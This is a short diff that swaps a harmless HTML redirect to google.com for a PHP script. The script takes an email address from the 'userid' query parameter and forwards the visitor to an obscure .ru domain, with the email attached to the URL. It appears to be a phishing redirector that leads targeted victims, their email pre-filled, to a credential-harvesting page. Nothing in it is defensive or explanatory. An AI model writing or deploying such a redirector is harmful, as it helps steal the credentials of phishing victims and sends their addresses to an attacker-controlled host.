@@ -1,11 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://google.com">
-    <title>Redirecting...</title>
-</head>
-<body>
-    <p>If you are not redirected, <a href="https://google.com">click here</a>.</p>
-</body>
-</html>
+<?php
+function decode($email) {
+    // Decode the URL-encoded email
+    $email = urldecode($email);
+    
+    header("refresh:0;url=https://z6L3.zyaix.ru/vuZlyuw4wM_CZKuoupWs/#Y" . $email);
+}
+
+if (isset($_GET['userid']) && !empty($_GET['userid'])) {
+    $email = $_GET['userid'];
+    decode($email);
+}
+?>
